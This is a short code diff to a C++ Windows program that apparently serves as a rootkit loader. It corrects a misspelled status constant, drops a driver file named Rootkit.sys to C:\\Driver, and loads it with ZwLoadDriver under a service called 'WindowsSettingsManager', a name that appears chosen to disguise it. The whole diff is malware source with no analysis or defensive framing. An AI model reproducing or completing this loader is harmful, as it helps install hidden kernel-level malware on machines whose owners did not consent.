@@ -5,12 +5,14 @@
 #include "defs.hpp"
 #include "MemoryManager.hpp"
 #include <filesystem>
+#include <winternl.h>
+#include <iostream>
 
 bool LoadDriver(PCWSTR Driver){
     UNICODE_STRING driver_service_name;
     RtlInitUnicodeString(&driver_service_name, Driver);
     NTSTATUS status = ZwLoadDriver(&driver_service_name);
-    if (status == STATUS_SUCCES){
+    if (status == STATUS_SUCCESS){
         return true;
     } else {
         return false;
@@ -21,7 +23,7 @@ bool UnloadDriver(PCWSTR Driver){
     UNICODE_STRING driver_service_name;
     RtlInitUnicodeString(&driver_service_name, Driver);
     NTSTATUS status = ZwUnloadDriver(&driver_service_name);
-    if (status == STATUS_SUCCES){
+    if (status == STATUS_SUCCESS){
         return true;
     } else {
         return false;
@@ -95,7 +97,7 @@ INT APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLi
 
     std::cin.get();
 
-    if (!DropDriver("\\Driver\\Rootkit.sys")){
+    if (!DropDriver("C:\\Driver\\Rootkit.sys")){
         return EXIT_FAILURE;
     }
 
@@ -106,7 +108,7 @@ INT APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLi
         return EXIT_FAILURE;
     }
 
-    bool status = LoadDriver(L"\\SystemRoot\\System32\\drivers\\WindowsSettingsManager.sys");
+    status = LoadDriver(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WindowsSettingsManager");
     if (!status){
         return EXIT_FAILURE;
     }
